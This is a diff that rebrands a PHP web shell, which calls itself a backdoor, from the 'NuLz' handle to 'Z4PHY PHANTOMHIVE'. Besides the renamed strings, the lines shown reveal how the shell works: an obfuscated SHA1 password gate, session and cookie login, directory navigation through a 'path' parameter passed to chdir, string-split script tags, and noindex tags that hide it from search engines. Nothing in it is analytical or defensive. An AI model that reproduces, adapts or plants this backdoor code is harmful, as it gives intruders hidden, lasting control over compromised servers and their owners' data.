@@ -393,11 +393,11 @@ $passwd = 'ad'.'d9'.'513'.'f'.'39'.'6a'.'c1'.'19'.'86'.'75'.'b'.'0'.'61'.'22'.'b
 $my_self = (empty($_SERVER['HTTPS']) ? 'http' : 'https') . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
 if (isset($_POST['gasken'])) {
     if (SHA1($_POST['passnya']) == $passwd) {
-        echo "<s"."cr"."ip"."t>"."al"."er"."t("."'Lo"."gi"."n "."Su"."cc"."es"."s!"." Yo"."u "."Pr"."o'".");"."</"."sc"."ri"."pt".">";
+        echo "<s"."cr"."ip"."t>"."al"."er"."t("."'Me"."ny"."al"."a "."Ab"."an"."gk"."u "."~!'".");"."</"."sc"."ri"."pt".">";
         $_SESSION["login"] = "login";
         setcookie('logined', $my_self, time() + 3600 * 24);
     } else {
-        echo "<s"."cr"."ip"."t>"."al"."er"."t("."'Lo"."gi"."n F"."ai"."le"."d!"." Y"."ou "."Nu"."b')".";<"."/s"."cr"."ip"."t>";
+        echo "<s"."cr"."ip"."t>"."al"."er"."t("."'Ma"."ti"." a"."e "."lu"." n"."oo"."b!')".";<"."/s"."cr"."ip"."t>";
     }
 }
 if (isset($_GET['logout'])) {
@@ -431,7 +431,7 @@ error was encountered while trying to use an ErrorDocument to handle the request
         exit();
     }
 }
-//NuLz Ganteng? yoi jelas dong
+//Z4PHY PHANTOMHIVE
 if (isset($_GET['path'])) {
     $path = $_GET['path'];
     chdir($_GET['path']);
@@ -447,14 +447,14 @@ $path = str_replace("\\", "/", $path);
     <title>.:<?=$s_he_ll_Name?>:. <?=$this_domain?></title>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=1024" />
-    <meta name="description" content="<?=$s_he_ll_Name?> Backdoor" />
+    <meta name="description" content="<?=$s_he_ll_Name?> C0DE" />
     <meta name="robots" content="noindex, nofollow" />
     <meta name="googlebot" content="noindex, nofollow" />
     <meta name="bingbot" content="noindex, nofollow" />
     <meta property="og:site_name" content="<?=$s_he_ll_Name?>" />
     <meta property="og:url" content="<?=$this_url?>" />
     <meta property="og:title" content=".:<?=$s_he_ll_Name?>:. <?=$this_domain?>" />
-    <meta property="og:description" content="<?=$s_he_ll_Name?> Backdoor" />
+    <meta property="og:description" content="<?=$s_he_ll_Name?> C0DE" />
     <meta property="og:image" content="<?=$s_he_ll_Logo?>" />
     <meta property="og:image:secure_url" content="<?=$s_he_ll_Logo?>" />
     <link rel="shortcut icon" href="<?=$s_he_ll_Icon?>" type="image/x-icon" />
@@ -1083,13 +1083,13 @@ $path = str_replace("\\", "/", $path);
                     </thead>
                     <tbody>
                         <tr>
-                            <td><?='-'.'-'.'N'.'u'.'L'.'z'.'-'.'-'?></td>
+                            <td><?='-'.'-'.'Z'.'4'.'P'.'H'.'Y'.'-'.'-'?></td>
                             <td class="body-folder uk-text-nowrap"><a href="?path=<?=dirname($path)?>" class="dirpath font-white"><i class="fa-duotone fa-folders font-amber"></i>&nbsp;&nbsp;..</a></td>
-                            <td><?='-'.'-'.'N'.'u'.'L'.'z'.'-'.'-'?></td>
-                            <td><?='-'.'-'.'N'.'u'.'L'.'z'.'-'.'-'?></td>
-                            <td><?='-'.'-'.'N'.'u'.'L'.'z'.'-'.'-'?></td>
-                            <td><?='-'.'-'.'N'.'u'.'L'.'z'.'-'.'-'?></td>
-                            <td><?='-'.'-'.'N'.'u'.'L'.'z'.'-'.'-'?></td>
+                            <td><?='-'.'-'.'Z'.'4'.'P'.'H'.'Y'.'-'.'-'?></td>
+                            <td><?='-'.'-'.'Z'.'4'.'P'.'H'.'Y'.'-'.'-'?></td>
+                            <td><?='-'.'-'.'Z'.'4'.'P'.'H'.'Y'.'-'.'-'?></td>
+                            <td><?='-'.'-'.'Z'.'4'.'P'.'H'.'Y'.'-'.'-'?></td>
+                            <td><?='-'.'-'.'Z'.'4'.'P'.'H'.'Y'.'-'.'-'?></td>
                         </tr>
                         <?php
                         foreach ($scan as $dir) {
